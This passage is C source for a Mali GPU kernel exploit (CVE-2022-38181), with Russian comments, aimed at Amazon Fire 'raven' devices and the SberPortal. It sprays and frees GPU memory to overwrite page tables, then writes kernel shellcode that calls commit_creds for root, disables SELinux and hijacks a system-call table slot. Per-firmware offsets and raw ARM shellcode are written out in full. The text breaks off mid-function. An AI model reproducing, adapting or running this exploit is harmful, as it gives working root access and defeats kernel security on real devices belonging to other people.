    }
  }
}

void write_func(int mali_fd, uint64_t func, uint64_t* reserved, uint64_t size, uint32_t* shellcode, uint64_t code_size) {
  uint64_t func_offset = (func + KERNEL_BASE) % 0x1000;
  uint64_t curr_overwrite_addr = 0;
  for (int i = 0; i < size; i++) {
    uint64_t base = reserved[i];
    uint64_t end = reserved[i] + RESERVED_SIZE * 0x1000;
    uint64_t start_idx = compute_pt_index(base, 3);
    uint64_t end_idx = compute_pt_index(end, 3);
    for (uint64_t addr = base; addr < end; addr += 0x1000) {
      uint64_t overwrite_addr = set_addr_lv3(addr);
      if (curr_overwrite_addr != overwrite_addr) {
        LOG("overwrite addr : %llx %llx\n", overwrite_addr + func_offset, func_offset);
        curr_overwrite_addr = overwrite_addr;
        for (int code = code_size - 1; code >= 0; code--) {
          write_to(mali_fd, overwrite_addr + func_offset + code * 4, shellcode[code], atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_32);
        }
        usleep(30000);
      }
    }
  }
}
// ---- READ primitive (НЕРАБОЧИЙ как CPU-чтение — оставлен как справка) ----
// ВАЖНО: CPU никогда не ходит через GPU MMU-таблицу, поэтому CPU-mmap НЕ увидит
// подменённую PTE. Прямого read-примитива у CVE-2022-38181 нет (только write).
// Единственный read-back канал — оракулы /proc/sys (см. VERIFY=5/6 ниже).
static uint64_t read_kernel(int mali_fd, int mali_fd2, uint64_t pgd, uint64_t data,
                            uint64_t* reserved, uint64_t size) {
  uint64_t phys = data + KERNEL_BASE;
  uint64_t data_offset = phys % 0x1000;
  uint64_t pte = ((phys >> PAGE_SHIFT) << PAGE_SHIFT) | 0x443;

  write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), pte,
           atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
  usleep(100000);

  for (uint64_t i = 0; i < size; i++) {
    uint64_t base = reserved[i];
    uint64_t end = base + RESERVED_SIZE * 0x1000;
    for (uint64_t addr = base; addr < end; addr += 0x1000) {
      uint64_t overwrite_addr = set_addr_lv3(addr);
      uint64_t off = (overwrite_addr + data_offset);
      void* m = mmap64(NULL, 0x1000, PROT_READ, MAP_SHARED, mali_fd2, off & ~0xfffULL);
      if (m == MAP_FAILED) continue;
      uint64_t v = *(uint64_t*)((char*)m + (off & 0xfff));
      munmap(m, 0x1000);
      if (v) return v;
    }
  }
  return 0;
}

// Проверки кандидатов чтением (вызывать ПОСЛЕ получения pgd/reserved в trigger()).
static int verify_sel_read(int fd, int fd2, uint64_t pgd, uint64_t* reserved) {
  uint64_t v = read_kernel(fd, fd2, pgd, sel_read_handle_unknown, reserved,
                           TOTAL_RESERVED_SIZE / RESERVED_SIZE);
  uint32_t w = (uint32_t)v;
  // пролог функции: stp x29,x30,[sp,#-N]! (0xa9?07bfd) или paciasp (0xd503233f)
  LOG("verify sel_read_handle_unknown: 0x%llx (word 0x%08x)\n", v, w);
  if ((w & 0xffc07bfd) == 0xa9807bfd || w == 0xd503233f) return 0;
  return -1;
}

/*
  char result = '2';
  sleep(3);
  int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY);
  read(enforce_fd, &result, 1);
  close(enforce_fd);
  LOG("result %d\n", result);
  return result;
}
*/

int run_enforce() {
  char result = '2';
  sleep(3);
  int enforce_fd = open("/sys/fs/selinux/reject_unknown", O_RDONLY);
  read(enforce_fd, &result, 1);
  close(enforce_fd);
  LOG("result %d\n", result);
  return result;
}


// ---- SberPortal (SberDevices stargate, Amlogic A311D/G12B, kernel 4.9.268) ----
// ВНИМАНИЕ: значения получены из НАШЕЙ пересборки ядра (4.9.269, LineageOS-дерево,
// Linaro GCC 6.3.1). Совпадение modversions с вендором ~47% -> оффсеты ОЦЕНОЧНЫЕ.
// Перед разрушительными записями их надо подтвердить (см. README_SBERPORTAL.md).
// offsets = symbol - _head  (kallsyms-стиль, как в остальных блоках)
#define SELINUX_ENFORCING_SBERPORTAL        0x1365c9c
#define SEL_READ_HANDLE_UNKNOWN_SBERPORTAL  0x3042d0
#define INIT_CRED_SBERPORTAL                0x1143478
#define COMMIT_CREDS_SBERPORTAL             0x6fd58
#define ADD_INIT_SBERPORTAL                 0x9111e000   // add x0, x0, #0x478 (init_cred & 0xfff)
#define ADD_COMMIT_SBERPORTAL               0x91356108   // add x8, x8, #0xd58 (commit_creds & 0xfff)

// --- однооффсетные оракулы (read-back через /proc/sys). См. README/заметки. ---
// ВНИМАНИЕ: на SberPortal /proc/sys/kernel/* для shell — Permission denied, эти
// два оракула НЕ читаются. Оставлены для справки/переопределения.
#define CORE_PATTERN_SBERPORTAL             0x1179930    // raw (наша сборка)
#define MODPROBE_PATH_SBERPORTAL            0x1141e58    // raw

// --- КОРРЕКЦИЯ СЕКЦИЙ ---
// Наша .text+.rodata крупнее вендорских => .rodata/.data/.bss сдвинуты ВВЕРХ.
// Сдвиги границ секций (в вендорском индексе): .text end/rodata +0xb0000,
// .init/.data +0xe0000, .bss +0xf4800..+0xf6490. См. build/correct_offsets_v2.py.
// Значения ниже = скорректированные (vendor-style) оффсеты.
#define INIT_UTS_NS_SBERPORTAL              0x104c628    // .data (uname() -> sysname/nodename)
#define LINUX_BANNER_SBERPORTAL             0x0ac0070    // .rodata (/proc/version), сдвиг .rodata почти точен
#define SELINUX_ENFORCING_CORR              0x12703ec
#define SEL_READ_HANDLE_UNKNOWN_CORR        0x301408
#define INIT_CRED_CORR                      0x1060a5f
#define COMMIT_CREDS_CORR                   0x6eeb4

void select_offset() {
  char fingerprint[256];
  int len = read_fingerprint("ro.build.fingerprint", fingerprint, sizeof(fingerprint));
  if (!fingerprint[0] || strstr(fingerprint, "__system_property_read_callback"))
    read_fingerprint("ro.vendor.build.fingerprint", fingerprint, sizeof(fingerprint));
  LOG("fingerprint: %s\n", fingerprint);

  {
    const char* v = getenv("RAVEN_VERIFY");
    g_verify_only = v ? atoi(v) : 0;
    uint64_t o_sel = env_hex("SP_SELINUX", 0), o_sru = env_hex("SP_SEL_READ", 0);
    uint64_t o_ic  = env_hex("SP_INIT_CRED", 0), o_cc = env_hex("SP_COMMIT_CREDS", 0);
    if (o_sel && o_sru && o_ic && o_cc) {
      selinux_enforcing = o_sel;
      sel_read_handle_unknown = o_sru;
      fixup_root_shell(o_ic, o_cc, o_sru,
                       (uint32_t)(0x91000000u | ((o_ic & 0xfff) << 10)),
                       (uint32_t)(0x91000108u | ((o_cc & 0xfff) << 10)));
      LOG("using env overrides (SP_*)\n");
      return;
    }
  }

  if (strstr(fingerprint, "stargate") || strstr(fingerprint, "SberDevices")) {
    selinux_enforcing = SELINUX_ENFORCING_SBERPORTAL;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_SBERPORTAL;
    fixup_root_shell(INIT_CRED_SBERPORTAL, COMMIT_CREDS_SBERPORTAL, SEL_READ_HANDLE_UNKNOWN_SBERPORTAL, ADD_INIT_SBERPORTAL, ADD_COMMIT_SBERPORTAL);
    return;
  }

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7201/942N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7201_942;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7201_942;
    fixup_root_shell(INIT_CRED_7201_942, COMMIT_CREDS_7201_942, SEL_READ_HANDLE_UNKNOWN_7201_942, ADD_INIT_7201_942, ADD_COMMIT_7201_942);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7204/1044N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7204_1044;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7204_1044;
    fixup_root_shell(INIT_CRED_7204_1044, COMMIT_CREDS_7204_1044, SEL_READ_HANDLE_UNKNOWN_7204_1044, ADD_INIT_7204_1044, ADD_COMMIT_7204_1044);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7204/1046N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7204_1046;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7204_1046;
    fixup_root_shell(INIT_CRED_7204_1046, COMMIT_CREDS_7204_1046, SEL_READ_HANDLE_UNKNOWN_7204_1046, ADD_INIT_7204_1046, ADD_COMMIT_7204_1046);
    return;  
  } 
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7206/1098N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7206_1098;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7206_1098;
    fixup_root_shell(INIT_CRED_7206_1098, COMMIT_CREDS_7206_1098, SEL_READ_HANDLE_UNKNOWN_7206_1098, ADD_INIT_7206_1098, ADD_COMMIT_7206_1098);
    return;  
  } 
   
  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7212/1333N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7212_1333;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7212_1333;
    fixup_root_shell(INIT_CRED_7212_1333, COMMIT_CREDS_7212_1333, SEL_READ_HANDLE_UNKNOWN_7212_1333, ADD_INIT_7212_1333, ADD_COMMIT_7212_1333);
    return;  
  } 
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7212/1335N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7212_1335;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7212_1335;
    fixup_root_shell(INIT_CRED_7212_1335, COMMIT_CREDS_7212_1335, SEL_READ_HANDLE_UNKNOWN_7212_1335, ADD_INIT_7212_1335, ADD_COMMIT_7212_1335);
    return;  
  } 
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7216/1582N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7216_1582;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7216_1582;
    fixup_root_shell(INIT_CRED_7216_1582, COMMIT_CREDS_7216_1582, SEL_READ_HANDLE_UNKNOWN_7216_1582, ADD_INIT_7216_1582, ADD_COMMIT_7216_1582);
    return;  
  } 
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7224/1752N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7224_1752;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7224_1752;
    fixup_root_shell(INIT_CRED_7224_1752, COMMIT_CREDS_7224_1752, SEL_READ_HANDLE_UNKNOWN_7224_1752, ADD_INIT_7224_1752, ADD_COMMIT_7224_1752);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7229/1850N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7229_1850;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7229_1850;
    fixup_root_shell(INIT_CRED_7229_1850, COMMIT_CREDS_7229_1850, SEL_READ_HANDLE_UNKNOWN_7229_1850, ADD_INIT_7229_1850, ADD_COMMIT_7229_1850);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7229/1853N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7229_1853;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7229_1853;
    fixup_root_shell(INIT_CRED_7229_1853, COMMIT_CREDS_7229_1853, SEL_READ_HANDLE_UNKNOWN_7229_1853, ADD_INIT_7229_1853, ADD_COMMIT_7229_1853);
    return;  
  } 
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7229/1856N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7229_1856;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7229_1856;
    fixup_root_shell(INIT_CRED_7229_1856, COMMIT_CREDS_7229_1856, SEL_READ_HANDLE_UNKNOWN_7229_1856, ADD_INIT_7229_1856, ADD_COMMIT_7229_1856);
    return;  
  }
  
    if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7234/2039N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7234_2039;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7234_2039;
    fixup_root_shell(INIT_CRED_7234_2039, COMMIT_CREDS_7234_2039, SEL_READ_HANDLE_UNKNOWN_7234_2039, ADD_INIT_7234_2039, ADD_COMMIT_7234_2039);
    return;  
  }
  
    if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7234/2042N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7234_2042;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7234_2042;
    fixup_root_shell(INIT_CRED_7234_2042, COMMIT_CREDS_7234_2042, SEL_READ_HANDLE_UNKNOWN_7234_2042, ADD_INIT_7234_2042, ADD_COMMIT_7234_2042);
    return;  
  }

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7242/2216N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7242_2216;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7242_2216;
    fixup_root_shell(INIT_CRED_7242_2216, COMMIT_CREDS_7242_2216, SEL_READ_HANDLE_UNKNOWN_7242_2216, ADD_INIT_7242_2216, ADD_COMMIT_7242_2216);
    return;  
  } 

 if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7242/2896N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7242_2896;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7242_2896;
    fixup_root_shell(INIT_CRED_7242_2896, COMMIT_CREDS_7242_2896, SEL_READ_HANDLE_UNKNOWN_7242_2896, ADD_INIT_7242_2896, ADD_COMMIT_7242_2896);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7242/2906N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7242_2906;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7242_2906;
    fixup_root_shell(INIT_CRED_7242_2906, COMMIT_CREDS_7242_2906, SEL_READ_HANDLE_UNKNOWN_7242_2906, ADD_INIT_7242_2906, ADD_COMMIT_7242_2906);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7242/3515N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7242_3515;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7242_3515;
    fixup_root_shell(INIT_CRED_7242_3515, COMMIT_CREDS_7242_3515, SEL_READ_HANDLE_UNKNOWN_7242_3515, ADD_INIT_7242_3515, ADD_COMMIT_7242_3515);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7242/3516N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7242_3516;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7242_3516;
    fixup_root_shell(INIT_CRED_7242_3516, COMMIT_CREDS_7242_3516, SEL_READ_HANDLE_UNKNOWN_7242_3516, ADD_INIT_7242_3516, ADD_COMMIT_7242_3516);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:7.0/PS7273/2625N:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7273_2625;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7273_2625;
    fixup_root_shell(INIT_CRED_7273_2625, COMMIT_CREDS_7273_2625, SEL_READ_HANDLE_UNKNOWN_7273_2625, ADD_INIT_7273_2625, ADD_COMMIT_7273_2625);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7279.2766N/0023253929472:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7279_2766;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7279_2766;
    fixup_root_shell(INIT_CRED_7279_2766, COMMIT_CREDS_7279_2766, SEL_READ_HANDLE_UNKNOWN_7279_2766, ADD_INIT_7279_2766, ADD_COMMIT_7279_2766);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7285.2877N/0023723719936:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7285_2877;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7285_2877;
    fixup_root_shell(INIT_CRED_7285_2877, COMMIT_CREDS_7285_2877, SEL_READ_HANDLE_UNKNOWN_7285_2877, ADD_INIT_7285_2877, ADD_COMMIT_7285_2877);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7285.2880N/0023723720704:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7285_2880;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7285_2880;
    fixup_root_shell(INIT_CRED_7285_2880, COMMIT_CREDS_7285_2880, SEL_READ_HANDLE_UNKNOWN_7285_2880, ADD_INIT_7285_2880, ADD_COMMIT_7285_2880);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7292.2982N/0024126400000:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7292_2982;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7292_2982;
    fixup_root_shell(INIT_CRED_7292_2982, COMMIT_CREDS_7292_2982, SEL_READ_HANDLE_UNKNOWN_7292_2982, ADD_INIT_7292_2982, ADD_COMMIT_7292_2982);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7292.2984N/0024126400512:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7292_2984;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7292_2984;
    fixup_root_shell(INIT_CRED_7292_2984, COMMIT_CREDS_7292_2984, SEL_READ_HANDLE_UNKNOWN_7292_2984, ADD_INIT_7292_2984, ADD_COMMIT_7292_2984);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7603.3110N/0025065956864:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7603_3110;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7603_3110;
    fixup_root_shell(INIT_CRED_7603_3110, COMMIT_CREDS_7603_3110, SEL_READ_HANDLE_UNKNOWN_7603_3110, ADD_INIT_7603_3110, ADD_COMMIT_7603_3110);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7608.3614N/0025468739072:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7608_3614;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7608_3614;
    fixup_root_shell(INIT_CRED_7608_3614, COMMIT_CREDS_7608_3614, SEL_READ_HANDLE_UNKNOWN_7608_3614, ADD_INIT_7608_3614, ADD_COMMIT_7608_3614);
    return;  
  } 

  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7614.3227N/0025938402048:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7614_3227;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7614_3227;
    fixup_root_shell(INIT_CRED_7614_3227, COMMIT_CREDS_7614_3227, SEL_READ_HANDLE_UNKNOWN_7614_3227, ADD_INIT_7614_3227, ADD_COMMIT_7614_3227);
    return;  
  }  
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7624.3337N/0026810845440:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7624_3337;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7624_3337;
    fixup_root_shell(INIT_CRED_7624_3337, COMMIT_CREDS_7624_3337, SEL_READ_HANDLE_UNKNOWN_7624_3337, ADD_INIT_7624_3337, ADD_COMMIT_7624_3337);
    return;  
  }  
  
  if (!strcmp(fingerprint, "Amazon/raven/raven:9/PS7633.3445N/0027347744000:user/amz-p,release-keys")) {
    selinux_enforcing = SELINUX_ENFORCING_7633_3445;
    sel_read_handle_unknown = SEL_READ_HANDLE_UNKNOWN_7633_3445;
    fixup_root_shell(INIT_CRED_7633_3445, COMMIT_CREDS_7633_3445, SEL_READ_HANDLE_UNKNOWN_7633_3445, ADD_INIT_7633_3445, ADD_COMMIT_7633_3445);
    return;  
  }

  err(1, "unable to match build id\n");
}

void cleanup(int mali_fd, uint64_t pgd) {
  write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), 2, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
}

void write_selinux(int mali_fd, int mali_fd2, uint64_t pgd, uint64_t* reserved) {
  uint64_t selinux_enforcing_addr = (((selinux_enforcing + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT)| 0x443;
  write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), selinux_enforcing_addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);

  usleep(100000);
  //Go through the reserve pages addresses to write to avc_denied with our own shellcode
  write_data(mali_fd2, selinux_enforcing, reserved, TOTAL_RESERVED_SIZE/RESERVED_SIZE, 0, MALI_WRITE_VALUE_TYPE_IMMEDIATE_32);
}

// Универсальная запись одного слова в произвольный kernel-адрес (для однооффсетных
// оракулов core_pattern / modprobe_path / hotplug, у которых есть read-back через
// /proc/sys/kernel/*). target_off — смещение от _head (KERNEL_BASE).
// Сырой syscall (armv7 EABI) — возвращает r0 как есть (без errno, чтобы увидеть
// возвращённый kernel-указатель).
static long raw_syscall(long n, long a0, long a1, long a2, long a3) {
  register long r7 __asm__("r7") = n;
  register long r0 __asm__("r0") = a0;
  register long r1 __asm__("r1") = a1;
  register long r2 __asm__("r2") = a2;
  register long r3 __asm__("r3") = a3;
  __asm__ volatile ("svc #0" : "+r"(r0) : "r"(r7), "r"(r1), "r"(r2), "r"(r3) : "memory");
  return r0;
}

// --- проверка хиджека слота compat_sys_call_table (точный .rodata) ---
// Пишем в слот адрес vzalloc (точный вендорский) и вызываем syscall(nr, 0x1000).
void write_kernel_word(int mali_fd, int mali_fd2, uint64_t pgd, uint64_t* reserved,
                       uint64_t target_off, uint64_t value, enum mali_write_value_type type);

static void verify_hijack(int mali_fd, int mali_fd2, uint64_t pgd, uint64_t* reserved) {
  uint64_t slot = env_hex("SP_SLOT", 0xac55E8);                 // compat_sys_call_table[189]
  uint64_t val  = env_hex("SP_SLOTVAL", 0xffffff800921bca0ULL); // vzalloc (vendor, abs)
  long nr = (long)env_hex("SP_NR", 189);
  LOG("VERIFY(11): slot off=0x%llx <- 0x%llx ; syscall nr=%ld\n", slot, val, nr);
  write_kernel_word(mali_fd, mali_fd2, pgd, reserved, slot, val, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
  usleep(200000);
  long r = raw_syscall(nr, 0x1000, 0, 0, 0);
  LOG("VERIFY(11): raw_syscall(%ld,0x1000)=0x%lx (%ld)\n", nr, (unsigned long)r, r);
  LOG("VERIFY(11): %s\n", (r == -38) ? "NO HIJACK (still ENOSYS)" : "HIJACK WORKS (!=ENOSYS)");
}

void write_kernel_word(int mali_fd, int mali_fd2, uint64_t pgd, uint64_t* reserved,
                       uint64_t target_off, uint64_t value, enum mali_write_value_type type) {
  uint64_t addr = (((target_off + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT) | 0x443;
  write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);

  usleep(100000);
  write_data(mali_fd2, target_off, reserved, TOTAL_RESERVED_SIZE/RESERVED_SIZE, value, type);
}

void write_shellcode(int mali_fd, int mali_fd2, uint64_t pgd, uint64_t* reserved) {
/*
  uint64_t avc_deny_addr = (((avc_deny + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT)| 0x443;
  write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), avc_deny_addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);

  usleep(100000);
  //Go through the reserve pages addresses to write to avc_denied with our own shellcode
  write_func(mali_fd2, avc_deny, reserved, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(permissive[0]), sizeof(permissive)/sizeof(uint32_t));

  //Triggers avc_denied to disable SELinux
  open("/dev/kmsg", O_RDONLY);
*/
  uint64_t sel_read_handle_unknown_addr = (((sel_read_handle_unknown + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT)| 0x443;
  write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), sel_read_handle_unknown_addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);

  //Call commit_creds to overwrite process credentials to gain root
  write_func(mali_fd2, sel_read_handle_unknown, reserved, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(root_code[0]), sizeof(root_code)/sizeof(uint32_t));
}

void spray(int mali_fd) {
    for (int j = 0; j < SPRAY_NUM; j++) {
        union kbase_ioctl_mem_alloc alloc = {0};
        alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR; // | (1 << 22);
        alloc.in.va_pages = SPRAY_PAGES;
        alloc.in.commit_pages = 0;
        mem_alloc(mali_fd, &alloc);
        gpu_va[j] = alloc.out.gpu_va;
    }
    for (int j = 0; j < SPRAY_NUM; j++) {
      mem_commit(mali_fd, gpu_va[j], SPRAY_PAGES);
    }

    for (int j = 0; j < SPRAY_NUM; j++) {
        void* region = mmap64(NULL, 0x1000 * SPRAY_PAGES, PROT_READ | PROT_WRITE, MAP_SHARED, mali_fd, gpu_va[j]);
        if (region == MAP_FAILED) {
          err(1, "spray region mmap failed %d\n", j);
        }
        gpu_regions[j] = region;
    }

}

// Освободить flush-регионы и сбросить индекс — продолжать попытки без OOM.
static void recycle_flush(int* flush_idx) {
  for (int q = 0; q < FLUSH_REGION_SIZE; q++) {
    if (flush_regions[q]) { munmap(flush_regions[q], FLUSH_SIZE); flush_regions[q] = 0; }
  }
  *flush_idx = 0;
}

int trigger(int mali_fd, int mali_fd2, int* flush_idx) {
  if (*flush_idx + NUM_TRIALS > FLUSH_REGION_SIZE) {
    return -2;   // flush-регионы исчерпаны: main освободит их и продолжит
  }
  uint64_t gpu_alloc_addr = map_gpu(mali_fd, 1, 1, false, 0);
  void* gpu_alloc_region = mmap64(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mali_fd, gpu_alloc_addr);
  if (gpu_alloc_region == MAP_FAILED) {
    err(1, "gpu_alloc_region mmap failed");
  }
  uint64_t jit_pages = SPRAY_PAGES;
  uint64_t jit_addr = jit_allocate(mali_fd, atom_number, jit_id, jit_pages, (uint64_t)gpu_alloc_addr, (uint64_t*)gpu_alloc_region); 
  atom_number++;
  mem_flags_change(mali_fd, (uint64_t)jit_addr, BASE_MEM_DONT_NEED, 0);

  for (int i = 0; i < NUM_TRIALS; i++) {
    union kbase_ioctl_mem_query query = {0};
    query.in.gpu_addr = jit_addr;
    query.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
    flush_regions[i] = flush(SPRAY_CPU, i + *flush_idx);
    if (ioctl(mali_fd, KBASE_IOCTL_MEM_QUERY, &query) < 0) {
      migrate_to_cpu(SPRAY_CPU);
      spray(mali_fd);
      LOG("region freed %d\n", i);
      uint64_t alias_region = alias_sprayed_regions(mali_fd);
      fault_pages();
      LOG("cleanup flush region\n");
      for (int r = 0; r < FLUSH_REGION_SIZE; r++) munmap(flush_regions[r], FLUSH_SIZE);

      uint64_t drain = drain_mem_pool(mali_fd);
      release_mem_pool(mali_fd, drain);
      printf("release_mem_pool\n");
      jit_free(mali_fd, atom_number, jit_id);

      reserve_pages(mali_fd2, RESERVED_SIZE, TOTAL_RESERVED_SIZE/RESERVED_SIZE, &(reserved[0]));
      LOG("jit_freed\n");

      int freed_idx = find_freed_idx(mali_fd);
      if (freed_idx == -1) err(1, "Failed to find freed_idx");
      LOG("Found freed_idx %d\n", freed_idx);

      int pgd_idx = find_pgd(freed_idx, 0);
      if (pgd_idx == -1) err(1, "Failed to find pgd");
      uint64_t pgd = alias_region + pgd_idx * 0x1000 + freed_idx * (SPRAY_PAGES * 0x1000);
      LOG("Found pgd %d, %llx\n", pgd_idx, pgd);
      atom_number++;
      // --- оракул через uname() (init_uts_ns.name) — читается ЛЮБЫМ процессом, без /proc/sys.
      // --- финальная эскалация: шеллкод в __dma_alloc + хиджек слота + вызов.
      if (g_verify_only == 12) {
        static const uint32_t sc[] = {
          0xd5384113,0xf9438e74,0xb900069f,0xb9000a9f,0xb9000e9f,0xb900129f,0xb900169f,0xb9001a9f,
          0xb9001e9f,0xb900229f,0xb900269f,0x92800015,0xf9001695,0xf9001a95,0xf9001e95,0xf9002295,
          0xf9002695,0xf9403e96,0xb4000116,0x52800037,0xb90002d7,0xb90006d7,0xb9000adf,0xb9000edf,
          0xb90012df,0xb90016df,0xd2800000,0xd65f03c0
        };
        uint64_t func = env_hex("SP_FUNC",     0x1d640);            // __dma_alloc (vendor offset)
        uint64_t slot = env_hex("SP_HIJACK",   0xac55E8);           // compat_sys_call_table[189]
        uint64_t fab  = env_hex("SP_FUNC_ABS", 0xffffff800909d640ULL);
        long nr = (long)env_hex("SP_NR", 189);
        uint64_t addr = (((func + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT) | 0x443;
        LOG("VERIFY(12): target __dma_alloc off=0x%llx, slot off=0x%llx, nr=%ld\n", func, slot, nr);
